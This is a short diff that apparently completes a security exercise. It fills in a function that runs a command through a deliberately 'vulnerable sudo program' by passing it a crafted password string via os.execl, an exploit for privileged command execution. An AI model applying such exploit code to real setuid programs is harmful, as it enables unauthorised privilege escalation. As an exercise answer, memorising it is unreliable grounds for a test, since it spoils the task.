@@ -20,8 +20,8 @@ def run_command(cmd: str, path_to_sudo: str):
     :param cmd: The command to run.
     :param path_to_sudo: The path to the vulnerable sudo program.
     """
-    # Your code goes here.
-    raise NotImplementedError()
+    password = "111111111\1"
+    os.execl(path_to_sudo, path_to_sudo, password, cmd) 
 
 
 def main(argv):
